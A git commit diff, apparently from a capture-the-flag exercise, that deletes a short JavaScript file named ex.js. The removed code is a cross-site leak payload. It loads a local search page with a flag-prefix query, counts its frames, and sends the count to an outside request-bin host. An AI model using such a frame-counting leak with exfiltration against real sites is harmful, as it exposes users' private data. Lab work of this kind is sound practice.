d7bbd55e06b28c536dd998f61c9c87a63ba5085d
parkttule <100356715+parkttule@users.noreply.github.com>
2023-02-17 17:29:41 +0900

    Update and rename ex.js to index.php

--- ex.js
+++
@@ -1,4 +0,0 @@
-var iframe = document.createElement("iframe");
-iframe.src = "http://127.0.0.1:8000/search?query=DH{";
-document.body.appendChild(iframe);
-iframe.onload = ()=>{location.href=`https://iqgfdip.request.dreamhack.games/${iframe.contentWindow.frames.length}`};
